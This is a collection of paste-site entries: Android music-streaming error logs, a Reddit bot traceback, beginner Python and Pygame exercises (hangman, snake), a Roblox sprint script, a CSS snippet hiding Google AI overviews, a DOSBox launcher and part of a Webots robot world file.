mode\u003dblock""]},""responseBody"":[123,34,109,101,115,115,97,103,101,34,58,34,68,105,100,32,101,120,112,101,99,116,32,111,110,101,32,114,101,115,117,108,116,32,98,117,116,32,102,111,117,110,100,32,110,111,110,101,32,119,104,101,110,32,101,120,101,99,117,116,105,110,103,58,32,113,117,101,114,121,32,92,34,83,69,76,69,67,84,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,42,44,32,96,102,105,108,101,96,46,96,110,97,109,101,96,32,65,83,32,96,102,105,108,101,110,97,109,101,96,44,32,96,102,105,108,101,96,46,96,115,105,122,101,96,44,32,96,102,105,108,101,96,46,96,109,116,105,109,101,96,32,65,83,32,96,102,105,108,101,95,109,111,100,95,116,105,109,101,96,44,32,96,102,105,108,101,96,46,96,112,97,114,101,110,116,96,32,65,83,32,96,102,111,108,100,101,114,95,105,100,96,44,92,110,92,116,92,116,92,116,92,116,92,116,92,116,96,97,108,98,117,109,96,46,96,110,97,109,101,96,32,65,83,32,96,97,108,98,117,109,95,110,97,109,101,96,44,32,96,97,114,116,105,115,116,96,46,96,110,97,109,101,96,32,65,83,32,96,97,114,116,105,115,116,95,110,97,109,101,96,44,32,96,103,101,110,114,101,96,46,96,110,97,109,101,96,32,65,83,32,96,103,101,110,114,101,95,110,97,109,101,96,92,110,92,116,92,116,92,116,92,116,70,82,79,77,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,92,110,92,116,92,116,92,116,92,116,73,78,78,69,82,32,74,79,73,78,32,96,42,80,82,69,70,73,88,42,102,105,108,101,99,97,99,104,101,96,32,96,102,105,108,101,96,92,110,92,116,92,116,92,116,92,116,79,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,102,105,108,101,95,105,100,96,32,61,32,96,102,105,108,101,96,46,96,102,105,108,101,105,100,96,92,110,92,116,92,116,92,116,92,116,73,78,78,69,82,32,74,79,73,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,97,108,98,117,109,115,96,32,96,97,108,98,117,109,96,92,110,92,116,92,116,92,116,92,116,79,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,97,108,98,117,109,95,105,100,96,32,61,32,96,97,108,98,117,109,96,46,96,105,100,96,92,110,92,116,92,116,92,116,92,116,73,78,78,69,82,32,74,79,73,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,97,114,116,105,115,116,115,96,32,96,97,114,116,105,115,116,96,92,110,92,116,92,116,92,116,92,116,79,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,97,114,116,105,115,116,95,105,100,96,32,61,32,96,97,114,116,105,115,116,96,46,96,105,100,96,92,110,92,116,92,116,92,116,92,116,76,69,70,84,32,74,79,73,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,103,101,110,114,101,115,96,32,96,103,101,110,114,101,96,92,110,92,116,92,116,92,116,92,116,79,78,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,103,101,110,114,101,95,105,100,96,32,61,32,96,103,101,110,114,101,96,46,96,105,100,96,92,110,92,116,92,116,92,116,92,116,87,72,69,82,69,32,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,117,115,101,114,95,105,100,96,32,61,32,63,32,65,78,68,32,40,96,42,80,82,69,70,73,88,42,109,117,115,105,99,95,116,114,97,99,107,115,96,46,96,105,100,96,32,61,32,63,41,32,92,34,59,32,112,97,114,97,109,101,116,101,114,115,32,65,114,114,97,121,92,110,40,92,110,32,32,32,32,91,48,93,32,61,92,117,48,48,51,69,32,97,114,97,107,117,115,97,92,110,32,32,32,32,91,49,93,32,61,92,117,48,48,51,69,32,51,49,48,50,57,92,110,41,92,110,59,32,108,105,109,105,116,32,92,34,92,34,59,32,111,102,102,115,101,116,32,92,34,92,34,34,125],""responseCode"":404,""responseMessage"":""Not Found"",""dataSpec"":{""absoluteStreamPosition"":17380736,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""key"":""https://cloud.arakusa.net/index.php/apps/music/ampache/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d09510515a4a672d6bd636721a149c3a5\u0026type\u003dsong\u0026id\u003d31029"",""length"":2736833,""position"":17380736,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2004,""detailMessage"":""Response code: 404"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.TeeDataSource"",""fileName"":""TeeDataSource.java"",""lineNumber"":54,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":802,""methodName"":""openNextSource""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":615,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":88,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1109,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1145,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":644,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1012,""methodName"":""run""}]}"
nBD2EzTJ,AttributeError: 'NoneType' object has no attribute 'name',basedcount_bot,Python,Wednesday 28th of May 2025 05:46:01 PM CDT,"Traceback (most recent call last):
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 275, in read_comments
    parent_info = await get_parent_info(comment)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec-server/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 237, in get_parent_info
    parent_author = parent_post.author.name
                    ^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'name'
"
kM2AdTVv,Hide Google AI overview (May 2025),sawczakl,CSS,Wednesday 28th of May 2025 04:56:31 PM CDT,"/*
1. Go to your browser extensions and add Live Editor for CSS

2. Run a Google search

3. Open the extension

4. Paste in the below code

5. Click the pin icon

6. You can close the extension window 
*/

div[data-al=""AI overview is ready""] {
    display: none;
}
"
Kz8Mk5FE,2025-05-28T22:52:25.664433,powerampache,PHP,Wednesday 28th of May 2025 03:52:25 PM CDT,"1.01-80-play (80) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.MusicException: {""errorAction"":""handshake"",""errorCode"":""4701"",""errorMessage"":""Received Invalid Handshake - Incorrect username or password"",""errorType"":""account""}
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl.tryAuthorize(MusicRepositoryImpl.kt:268)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl.access$tryAuthorize(MusicRepositoryImpl.kt:83)
	at luci.sixsixsix.powerampache2.data.MusicRepositoryImpl$tryAuthorize$1.invokeSuspend(Unknown Source:18)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:959)
	at android.os.Handler.dispatchMessage(Handler.java:100)
	at android.os.Looper.loopOnce(Looper.java:257)
	at android.os.Looper.loop(Looper.java:342)
	at android.app.ActivityThread.main(ActivityThread.java:9634)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:619)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:929)

authorize() - {""errorAction"":""handshake"",""errorCode"":""4701"",""errorMessage"":""Received Invalid Handshake - Incorrect username or password"",""errorType"":""account""}"
gTK7qJyc,2025-05-28T22:52:05.808064,powerampache,PHP,Wednesday 28th of May 2025 03:52:05 PM CDT,"1.01-80-play (80) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""Unable to resolve host ""mine.p2d.moe"": No address associated with hostname"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:644)
	at java.lang.Thread.run(Thread.java:1012)

"
py4WBfvx,Global Window Alert System,Th3Ward3n,HTML,Wednesday 28th of May 2025 03:42:21 PM CDT,"<div id=""alert-container"">
    <!-- ERROR -->
    <dialog id=""alert-error"" class=""a-error"">
        <div class=""spc-btw gap-15p"">
            <p>== Text Content ==</p>
            <button autofocus onclick=""dismissAlert('error');"">Close</button>
        </div>
    </dialog>
    <!-- WARNING -->
    <dialog id=""alert-warning"" class=""a-warning"">
        <div class=""spc-btw gap-15p"">
            <p>== Text Content ==</p>
            <button autofocus onclick=""dismissAlert('warning');"">Close</button>
        </div>
    </dialog>
    <!-- INFO -->
    <dialog id=""alert-info"" class=""a-info"">
        <div class=""spc-btw gap-15p"">
            <p>== Text Content ==</p>
            <button autofocus onclick=""dismissAlert('info');"">Close</button>
        </div>
    </dialog>
    <!-- SUCCESS -->
    <dialog id=""alert-success"" class=""a-success"">
        <div class=""spc-btw gap-15p"">
            <p>== Text Content ==</p>
            <button autofocus onclick=""dismissAlert('success');"">Close</button>
        </div>
    </dialog>
</div>
<script>
    /** @typedef {""error"" | ""warning"" | ""info"" | ""success""} ValidAlertTypes */
    const validAlertTypeList = [""error"", ""warning"", ""info"", ""success""];
    /** 
     * @param alertType {ValidAlertTypes}
     * @returns {HTMLDialogElement}
     */
    const findDialog = (alertType) => {
        const diaEle = document.querySelector(`dialog#alert-${alertType}`);
        if (!diaEle) throw new Error(`[WARNING] Failed to find Dialog with id alert-${alertType}!`);
        return diaEle;
    };

    class AlertManager {
        parentDialog;
        textContainer;
        /** @param alertType {ValidAlertTypes} */
        constructor(alertType) {
            this.parentDialog = findDialog(alertType);
            this.textContainer = Object.values(
                Object.values(this.parentDialog.childNodes)
                .find((child) => child instanceof HTMLDivElement).childNodes
            ).find((child) => child instanceof HTMLParagraphElement);
        }

        get dlog() { return this.parentDialog; }
        get isOpen() { return this.dlog.hasAttribute('open'); }
        /** @param txt {string} */
        set txtDisplay(txt) { this.textContainer.textContent = txt; }

        // TODO: Calculate position of prexisting dialog boxes currently `open`
        // Apply position shift to prevent overlap, accounting for translation distance to take up `closed` boxes
        show() { this.dlog.show(); }
        close() { this.dlog.close(); }
    }

    const dialogContainer = {
        error: new AlertManager('error'),
        warning: new AlertManager('warning'),
        info: new AlertManager('info'),
        success: new AlertManager('success')
    };

    /** @param alertType {ValidAlertTypes} */
    function dismissAlert(alertType) {
        console.log(alertType);
        if (dialogContainer[alertType].isOpen) dialogContainer[alertType].close();
    }

    
    window.addEventListener(""message"", (event) => {
        /** 
         * @typedef {
            {
               message: string,
               type: ValidAlertTypes 
            }
         } ValidMsgPayload 
         */
        if (event.origin !== ""http://127.0.0.1:4450"") return;
        /** @type {ValidMsgPayload} */
        const msgPayload = event.data;
        if (typeof msgPayload === 'string' || !validAlertTypeList.includes(msgPayload.type)) return;
        
        dialogContainer[msgPayload.type].txtDisplay = msgPayload.message;
        dialogContainer[msgPayload.type].show();

        setTimeout(() => { dialogContainer[msgPayload.type].close(); }, 4400);
    });
</script>"
CW70Wzee,Basic script,Thesxctriper23214,Lua,Wednesday 28th of May 2025 12:50:35 PM CDT,"--[[
Sprint Script
Features:
• Smooth acceleration/deceleration for walk ↔ sprint transitions
• Stamina management with depletion and regeneration
• Subtle camera roll (tilt) on sprint using local forward‐axis rotation
• Configurable parameters for speed, rates, and tilt
]]

local Players          = game:GetService(""Players"")
local RunService       = game:GetService(""RunService"")
local UserInputService = game:GetService(""UserInputService"")

local player    = Players.LocalPlayer
local camera    = workspace.CurrentCamera
local character, humanoid, rootPart

-- Configuration
local walkSpeed    = 16
local sprintSpeed  = 32
local accelRate    = 50       -- studs/s²
local decelRate    = 70       -- studs/s²
local maxStamina   = 5        -- seconds
local staminaDrain = 1        -- per second
local staminaRegen = 0.5      -- per second
local tiltAngle    = 5        -- degrees of roll
local tiltSpeed    = 10       -- interpolation speed

-- State
local currentSpeed = walkSpeed
local isSprinting  = false
local stamina      = maxStamina
local currentRoll  = 0        -- radians

-- Handle respawns
local function onCharacterAdded(char)
    character = char
    humanoid   = char:WaitForChild(""Humanoid"")
    rootPart   = char:WaitForChild(""HumanoidRootPart"")
    
    -- reset state
    currentSpeed = walkSpeed
    isSprinting  = false
    stamina      = maxStamina
    currentRoll  = 0
end

player.CharacterAdded:Connect(onCharacterAdded)
if player.Character then
    onCharacterAdded(player.Character)
end

-- Detect sprint input
UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.LeftShift then
        isSprinting = true
    end
end)

UserInputService.InputEnded:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.LeftShift then
        isSprinting = false
    end
end)

-- Main update loop
RunService.RenderStepped:Connect(function(dt)
    if not humanoid then return end

    local moving = humanoid.MoveDirection.Magnitude > 0

    -- Determine target speed
    local targetSpeed = (isSprinting and moving and stamina > 0)
        and sprintSpeed
        or walkSpeed

    -- Smooth acceleration/deceleration
    if currentSpeed < targetSpeed then
        currentSpeed = math.min(currentSpeed + accelRate * dt, targetSpeed)
    elseif currentSpeed > targetSpeed then
        currentSpeed = math.max(currentSpeed - decelRate * dt, targetSpeed)
    end
    humanoid.WalkSpeed = currentSpeed

    -- Stamina logic
    if isSprinting and moving and stamina > 0 then
        stamina = math.max(stamina - staminaDrain * dt, 0)
        if stamina == 0 then
            isSprinting = false
        end
    else
        stamina = math.min(stamina + staminaRegen * dt, maxStamina)
    end

    -- Improved camera roll tilt
    local targetRoll = (currentSpeed > walkSpeed + 0.1)
        and math.rad(tiltAngle)
        or 0
    local alpha     = math.clamp(tiltSpeed * dt, 0, 1)
    local deltaRoll = (targetRoll - currentRoll) * alpha

    if math.abs(deltaRoll) > 1e-4 then
        -- Rotate camera around its local forward axis
        camera.CFrame = camera.CFrame * CFrame.Angles(0, 0, deltaRoll)
        currentRoll = currentRoll + deltaRoll
    end
end)
"
mFLFK0wF,04. Search,Andonoff,Python,Wednesday 28th of May 2025 12:38:50 PM CDT,"n = int(input())
word = input()

data_list = []

for _ in range(n):
    data_list.append(input())

print(data_list)

for element in data_list:
    if word not in element: # <- махаме елемента, в който думата я няма.
        data_list.remove(element)
        
print(data_list)"
MGKKFrE2,Untitled,Andonoff,Python,Wednesday 28th of May 2025 12:36:45 PM CDT,"n = int(input())
word = input()

data_list = []

for _ in range(n):
    data_list.append(input())

print(data_list)

for element in data_list:
    if word not in element:
        data_list.remove(element)
    print(element)
print(data_list)"
YkNySMaz,DosBox - Win95 image,caffeine314,Batch,Wednesday 28th of May 2025 12:22:02 PM CDT,"@echo off

set ""DOSBOX_EXE=D:\Program Files\DOSBox-X\dosbox-x.exe""
set ""DOGDAY_DIR=E:\Gaming\DosBox\DogDay""
set ""WIN_ISO=WIN950~1.ISO""

:: A larger disk image (e.g., 500MB–2GB) that emulates a hard drive.  Acts as a
:: virtual C: drive where Win 95 will actually be installed and run.  Created with:
::    imgmake win95.img -t hd -chs 512,16,63 -size 500
set ""WIN_IMG=hdd.img""

:: A 1.44MB floppy image that emulates a bootable DOS disk.  Used to boot into DOS
:: so you can partition and format the hard drive and start the Win 95 installer
set ""BOOT_IMG=win95b.img""



cd /d ""%DOGDAY_DIR%""

""%DOSBOX_EXE%"" ^
  -c ""mount y ."" ^
  -c ""imgmount 2 y:\%WIN_IMG% -t hdd -fs none -ide 1"" ^
  -c ""imgmount 3 y:\%WIN_ISO% -t cdrom -ide 2m"" ^
  -c ""boot y:\%BOOT_IMG%""

"
4kjaS7jN,FinalProject,slavi146,Python,Wednesday 28th of May 2025 11:58:30 AM CDT,"def word_counter(text):
    word_count = {}
    textwords = text.lower().split()
    for word in textwords:
        word = """".join(char for char in word if char.isalpha())
        if word.isalpha():
            if word in word_count:
                word_count[word] += 1
            else:
                word_count[word] = 1
        else:
            try:
                raise ValueError(""Input must be only string!"")
            except ValueError:
                print(""Everything is fine."")
    return word_count
text = input()

dict = word_counter(text)
for i, j in dict.items():
    print(f'{i}:{j}')

with open('rechnik s dumi i tehniq broi', 'w') as f:
    for i, j in dict.items():
        f.write(f'{i}:{j}\n')

setwithvalues = set(dict.values())
print(setwithvalues)


list_words = list(dict.keys())
print(list_words)


"
zhDKutzK,jablko.py,black_duck11,Python,Wednesday 28th of May 2025 11:22:11 AM CDT,"import random
import pygame
class Jablko(pygame.sprite.Sprite):
    def __init__(self):
        super().__init__()
        self.obraz=pygame.image.load('images/apple.png')
        self.rect=pygame.Rect(random.randint(0,24)*32,random.randint(0,18)*32,32,32)

"
e3d5jwDt,kati,boyan1324,Python,Wednesday 28th of May 2025 11:18:47 AM CDT,"import random

# Думи за игра
words = [""компютър"", ""училище"", ""игра"", ""часовник"", ""кола"", ""пъзел""]

# Избиране на дума
chosen_word = random.choice(words)
hidden_letters = [""_"" for _ in chosen_word]
guessed_letters = []
tries = 9

# Статистика (речник)
stats = {
    ""опити"": tries,
    ""грешки"": 0,
    ""познати_букви"": 0
}

print(""=== Игра на Бесеница ==="")

while ""_"" in hidden_letters and tries > 0:
    print(""\nДума: "", "" "".join(hidden_letters))
    print(""Оставащи опити:"", tries)
    print(""Познати букви:"", "", "".join(guessed_letters))

    try:
        letter = input(""Въведи буква: "").strip().lower()

        if not letter.isalpha() or len(letter) != 1:
            raise ValueError(""Моля, въведи само една буква."")

        if letter in guessed_letters:
            print(""Вече си пробвал тази буква."")
            continue

        guessed_letters.append(letter)

        if letter in chosen_word:
            for i in range(len(chosen_word)):
                if chosen_word[i] == letter:
                    hidden_letters[i] = letter
                    stats[""познати_букви""] += 1
            print(""Позна!"")
        else:
            tries -= 1
            stats[""грешки""] += 1
            print(""Грешка!"")

    except ValueError as ve:
        print(""Грешка:"", ve)
    except Exception as e:
        print(""Възникна неочаквана грешка:"", e)

# Резултат (tuple)
result = (""Поздравления!"" if ""_"" not in hidden_letters else ""Не успя."",
          chosen_word,
          stats[""познати_букви""],
          stats[""грешки""])

print(""\n=== Край на играта ==="")
print(result[0])
print(f""Думата беше: {result[1]}"")
print(f""Познати букви: {result[2]}, Грешки: {result[3]}"")

# Запис във файл (file handling)
try:
    with open(""hangman_results.txt"", ""a"", encoding=""utf-8"") as file:
        file.write(f""Резултат: {result[0]}, Дума: {result[1]}, Познати: {result[2]}, Грешки: {result[3]}\n"")
    print(""Резултатът е записан във файл hangman_results.txt"")
except Exception:
    print(""Грешка при запис във файл."")
"
1y5JZ4dk,Segment.py,black_duck11,Python,Wednesday 28th of May 2025 11:13:08 AM CDT,"import pygame
import copy
class Segment(pygame.sprite.Sprite):
    def __init__(self):
        super().__init__()
        self.obraz=pygame.image.load('images/segment.png')
        
        self.pozycja=pygame.Rect(-32,-32,32,32)
        self.ostatnia_pozycja=None
    def przesun(self,nowa_pozycja):
        self.ostatnia_pozycja=copy.deepcopy(self.pozycja)
        self.pozycja=copy.deepcopy(nowa_pozycja)
       

"
eDNsazPj,backpackloot.lua,Ubidibity,Lua,Wednesday 28th of May 2025 10:57:18 AM CDT,"-- Mobs drop backpacks now.  great.  This is my first attempt at repurposing this program to go through a backpack and empty it out

-- Rough draft!!

local chest=peripheral.wrap(""back"")
local chest2=peripheral.wrap(""right"")

local backpack=peripheral.wrap(""front"")
local size=backpack.size()

print(backpack.name.."", ""..backpack.size)

for x=1,chest.size() do
  turtle.dig()
  turtle.  -- this is incomplete, I'll come back to it but have RL stuff to do right now.
  for i=1,size do
    local slot = backpack.getItemDetail(i)
    if backpack.getItemDetail(i)~=nil then
      print(""slot ""..i..""contains ""..slot.name) -- find relevant property to check max_dmg=""..slot.max_dmg.."", dmg=""..slot.dmg)
      backpack.pushItem(""UP"",1)
    end
  end
"
xca9emyp,Dataset Download,Infinity99HD,Python,Wednesday 28th of May 2025 10:46:32 AM CDT,"# Dataset download

def download_dataset(
        url=""https://proai-datasets.s3.eu-west-3.amazonaws.com/progetto-finale-flowes.tar.gz"", 
        tar_name=""progetto-finale-flowes.tar.gz"", 
        extracted_file_name=""progetto-finale-flowes""
                     ):
    """"""
    Downloads and extracts the dataset if it does not already exist.
    """"""

    if not os.path.exists(""progetto-finale-flowes.tar.gz""):
        print(""Downloading dataset..."")
        file = requests.get(url)

        if file.status_code == 200:
            with open(tar_name, ""wb"") as f:
                f.write(file.content)
                print(""Download complete!"")

            if not os.path.exists(extracted_file_name):
                print(""Extracting dataset..."")
                with tarfile.open(tar_name, ""r:gz"") as f:
                    f.extractall(path=extracted_file_name)
                    print(""Extraction complete!"")

                    # Change directory to the extracted folder
                    os.rename(""progetto-finale-flowes/progetto-finale-flowes"", ""dataset"")
        else:
            print(""Failed to download dataset. Status code:"", file.status_code)"
RAnyV25g,Kierunek.py,black_duck11,Python,Wednesday 28th of May 2025 10:10:33 AM CDT,"from enum import Enum
class Kierunek(Enum):
    GORA = 0
    PRAWO = 1
    DOL = 2
    LEWO = 3"
aa7k6rW5,Waz.py,black_duck11,Python,Wednesday 28th of May 2025 10:09:12 AM CDT,"import pygame
import copy
from Kierunek import Kierunek
from Segment import Segment
class Waz(pygame.sprite.Sprite):
    def __init__(self):
    #oryginalny obraz głowy
        
        self.oryginalny_obraz = pygame.image.load(""images/head.png"")
    
        self.obraz = pygame.transform.rotate(self.oryginalny_obraz, 0)
    #współrzędne głowy
        self.rect = self.obraz.get_rect(center=(12*32+16, 9*32+16))#aktualna pozycja
        self.kierunek = Kierunek.GORA
        self.nowy_kierunek = Kierunek.GORA
        self.ostatnia_pozycja=self.rect
        self.dodaj_segment=False
        self.segmenty=[]#lista ze wszystkimi segmentami


        
    def zmien_kierunek(self, kierunek):
        zmiana_mozliwa = True
        if kierunek == Kierunek.GORA and self.kierunek == Kierunek.DOL:
            zmiana_mozliwa = False
        if kierunek == Kierunek.DOL and self.kierunek == Kierunek.GORA:
            zmiana_mozliwa=False
        if kierunek == Kierunek.LEWO and self.kierunek == Kierunek.PRAWO:
            zmiana_mozliwa = False
        if kierunek == Kierunek.PRAWO and self.kierunek == Kierunek.LEWO:
            zmiana_mozliwa = False
        if zmiana_mozliwa:
            self.nowy_kierunek = kierunek
            
    def aktualizuj(self):
        self.kierunek = self.nowy_kierunek
        self.obraz = pygame.transform.rotate(self.oryginalny_obraz,(self.kierunek.value*-90))
        self.ostatnia_pozycja=copy.deepcopy(self.rect)
        if self.kierunek == Kierunek.GORA:
            self.rect.move_ip(0, -32)
        if self.kierunek == Kierunek.PRAWO:
            self.rect.move_ip(32, 0)
        if self.kierunek == Kierunek.LEWO:
            self.rect.move_ip(-32, 0)
        if self.kierunek == Kierunek.DOL:
            self.rect.move_ip(0, 32)
        for segment in range(len(self.segmenty)):
            #dla pierwszego segmenty
            if segment==0:
                #przesunięcie pierwszego segmentu do ostatniej pozycji głowy
                self.segmenty[segment].przesun(self.ostatnia_pozycja)
            else:
                self.segmenty[segment].przesun(self.segmenty[segment-1].ostatnia_pozycja)
        if self.dodaj_segment:
            nowy_segment=Segment()
            nowa_pozycja=None
            if len(self.segmenty)>0:
                nowa_pozycja =copy.deepcopy(self.segmenty[-1].pozycja)
            else:
                nowa_pozycja=copy.deepcopy(self.ostatnia_pozycja)
            nowy_segment.pozycja=nowa_pozycja
            self.segmenty.append(nowy_segment)
            self.dodaj_segment=False
            
    def rysuj_segment(self,ekran):
        for segment in self.segmenty:
            ekran.blit(segment.obraz,segment.pozycja)
    def jedz_jablko(self):
        self.dodaj_segment=True
    





        



        "
piq3dpgy,4wheelscontroller.py,DrAungWinHtut,Python,Wednesday 28th of May 2025 10:00:56 AM CDT,"from controller import Robot

if __name__=='__main__':
    robot = Robot()
    
    timestep = 64
    max_speed = 6.28
    
    left_front_motor = robot.getDevice('motor_left_front')
    right_front_motor = robot.getDevice('motor_right_front')
    left_back_motor = robot.getDevice('motor_left_back')
    right_back_motor = robot.getDevice('motor_right_back')
    #left_motor.setPosition(float('inf'))
    left_front_motor.setPosition(float('inf'))
    right_front_motor.setPosition(float('inf'))
    left_back_motor.setPosition(float('inf'))
    right_back_motor.setPosition(float('inf'))
    left_front_motor.setVelocity(10);
    right_front_motor.setVelocity(10);
    left_back_motor.setVelocity(10);
    right_back_motor.setVelocity(10);
    "
VNe1xMh0,4wheels1.wbt,DrAungWinHtut,JSON,Wednesday 28th of May 2025 09:59:53 AM CDT,"#VRML_SIM R2025a utf8

EXTERNPROTO ""https://raw.githubusercontent.com/cyberbotics/webots/R2025a/projects/objects/backgrounds/protos/TexturedBackground.proto""
EXTERNPROTO ""https://raw.githubusercontent.com/cyberbotics/webots/R2025a/projects/objects/backgrounds/protos/TexturedBackgroundLight.proto""
EXTERNPROTO ""https://raw.githubusercontent.com/cyberbotics/webots/R2025a/projects/objects/floors/protos/RectangleArena.proto""

WorldInfo {
}
Viewpoint {
  orientation 0.07987357375373524 -0.10424624051044758 -0.9913389599704254 4.967162579952054
  position -0.1355848939873358 -0.7054274144021473 0.2015211425405409
}
TexturedBackground {
}
TexturedBackgroundLight {
}
RectangleArena {
  floorSize 2 2
}
Solid {
  translation 0.21 0 0
  children [
    Shape {
      appearance PBRAppearance {
        baseColor 0 0 0
        roughness 1
        metalness 0
      }
      geometry Box {
        size 0.05 0.05 0.05
      }
    }
  ]
}
DEF Robot Robot {
  translation -6.009278448241306e-05 0.02005605151113183 0.020634987421419324
  rotation 0.13121761188466757 -0.0005927504440141294 -0.9913534117448712 3.873043426496412e-05
  children [
    DEF SolidBody Solid {
      translation -2.855527945213741e-14 6.938893903907228e-18 -0.0007249040012106758
      rotation 0 0 -1 6.408428074369474e-07
      children [
        DEF Left_Back_Joint HingeJoint {
          jointParameters DEF Left_Back_Joint HingeJointParameters {
            position -2.3871655094803524e-08
            axis 0 1 0
            anchor -0.05 0.05 0
          }
          device [
            RotationalMotor {
              name ""motor_left_back""
            }
          ]
          endPoint Solid {
            translation -0.05000000000000002 0.05 6.063894724883258e-10
            rotation 0.9999999999999196 -3.3863989185341237e-07 2.1511559365139866e-07 1.570000003442234
            children [
              DEF wheel Shape {
                appearance PBRAppearance {
                  baseColor 1 0 0
                  roughness 1
                  metalness 0
                }
                geometry Cylinder {
                  height 0.01
                  radius 0.02
                }
              }
            ]
            name ""solid2(3)""
            boundingObject DEF wheel Shape {
              appearance PBRAppearance {
                baseColor 1 0 0
                roughness 1
                metalness 0
              }
              geometry Cylinder {
                height 0.01
                radius 0.02
              }
            }
            physics Physics {
            }
          }
        }
        DEF Right_Back_Joint HingeJoint {
          jointParameters DEF Right_Back_Joint HingeJointParameters {
            position -1.3708306093926636e-08
            axis 0 1 0
            anchor -0.05 -0.05 0
          }
          device [
            RotationalMotor {
              name ""motor_right_back""
            }
          ]
          endPoint Solid {
            translation -0.05 -0.05 -1.0989830969372583e-10
            rotation 0.9999999999999224 -3.3355418454286464e-07 2.1003393776393883e-07 1.5699999964904536
            children [
              DEF wheel Shape {
                appearance PBRAppearance {
                  baseColor 1 0 0
                  roughness 1
                  metalness 0
                }
                geometry Cylinder {
                  height 0.01
                  radius 0.02
                }
              }
            ]
            name ""solid2(2)""
            boundingObject DEF wheel Shape {
              appearance PBRAppearance {
                baseColor 1 0 0
                roughness 1
                metalness 0
              }
              geometry Cylinder {
                height 0.01
                radius 0.02
              }
            }
            physics Physics {
            }
          }
        }
        DEF Right_Front_Joint HingeJoint {
          jointParameters DEF Right_Front_Joint HingeJointParameters {
            position -2.4635991639223045e-08
            axis 0 1 0
            anchor 0.05 0.05 0
          }
          device [
            RotationalMotor {
              name ""motor_right_front""
            }
          ]
          endPoint Solid {
            translation 0.04999999999999999 0.05 6.16379873032281e-10
            rotation 0.9999999999999527 1.46934204554187e-07 -2.700719703756882e-07 1.5699999991142959
            children [
              DEF wheel Shape {
                appearance PBRAppearance {
                  baseColor 1 0 0
                  roughness 1
                  metalness 0
                }
                geometry Cylinder {
                  height 0.01
                  radius 0.02
                }
              }
            ]
            name ""solid2(1)""
            boundingObject DEF wheel Shape {
              appearance PBRAppearance {
                baseColor 1 0 0
                roughness 1
                metalness 0
              }
              geometry Cylinder {
                height 0.01
                radius 0.02
              }
            }
            physics Physics {
            }
          }
        }
        DEF Left_Front_Joint HingeJoint {
          jointParameters DEF Left_Front_Joint HingeJointParameters {
            axis 0 1 0
            anchor 0.05 -0.05 0
          }
          device [
            RotationalMotor {
              name ""motor_left_front""
            }
          ]
          endPoint Solid {
